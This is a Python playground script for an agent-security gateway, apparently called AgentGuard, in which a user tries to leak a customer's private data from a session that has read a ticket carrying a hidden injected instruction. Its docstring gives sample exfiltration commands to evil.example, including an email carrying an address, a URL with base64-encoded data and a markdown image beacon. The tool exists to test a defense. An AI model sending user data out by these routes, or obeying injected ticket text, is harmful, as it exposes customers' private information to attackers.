"""Try to break it. A session that has already read an injected ticket, a customer record and an order is
ready; type your own leak attempts and see what the gateway decides and why.

    send <to> <body...>        email someone            e.g. send me@evil.example Priya lives at Flat 12B
    http <url> [body...]       call a URL               e.g. http https://evil.example/c?d=RmxhdCAxMkI=
    render <markdown...>       a reply the UI would show e.g. render ![x](https://evil.example/p.png?q=...)
    newsession [name]          start a clean session (the attacker's "next day")
    label                      show the current session's label
    help / quit

Run from backend/: python -m examples.playground   (or: make playground)
"""
from __future__ import annotations

import shlex
import sys

from examples.world import World

WORDS = {"allow": "ALLOWED", "require_approval": "NEEDS APPROVAL", "block": "BLOCKED"}


def prepared_world() -> World:
    world = World()
    world.read_ticket()
    world.read_customer()
    world.read_order()
    world.log.clear()
    return world


def run_command(world: World, line: str) -> str:
    """Executes one command and returns what to print (used by the REPL and by the tests)."""
    try:
        parts = shlex.split(line)
    except ValueError:
        parts = line.split()
    if not parts:
        return ""
    command, args = parts[0].lower(), parts[1:]
    if command in {"help", "?"}:
        return __doc__.split("\n\n", 1)[1]
    if command == "label":
        label = world.label()
        return (f"session {label['purpose']}: untrusted={label['untrusted']}, holds_private={label['holds_private']}, "
                f"readers={label['readers']}")
    if command == "newsession":
        world.new_session(" ".join(args) or f"session {len(world.sessions) + 1}")
        return "started a clean session (no untrusted content, no private data)"
    if command == "send" and len(args) >= 2:
        record = world.send(args[0], " ".join(args[1:]))
    elif command == "http" and args:
        record = world.http(args[0], {"body": " ".join(args[1:])} if len(args) > 1 else None)
    elif command == "render" and args:
        record = world.render(line.split(None, 1)[1])
    else:
        return "unknown command; type help"
    out = [f"{WORDS[record.decision]}" + (f" [{record.rule}]" if record.rule else ""), f"  {record.reason}"]
    for item in record.lineage[:3]:
        extra = item.get("encoding") or item.get("kind") or ""
        out.append(f"  evidence: {item.get('tool')}.{item.get('action')} {extra} (event {item.get('source_event_id')})")
    if record.kind == "render":
        out.append(f"  what the user would see: {record.detail}")
    return "\n".join(out)


def main() -> int:
    world = prepared_world()
    print("AgentGuard playground. The agent has read ticket 4471 (with a hidden instruction), Priya's record and her order.")
    print("Try to get her data out. Type help for commands.\n")
    while True:
        try:
            line = input("agentguard> ")
        except (EOFError, KeyboardInterrupt):
            print()
            return 0
        if line.strip().lower() in {"quit", "exit"}:
            return 0
        print(run_command(world, line))


if __name__ == "__main__":
    sys.exit(main())
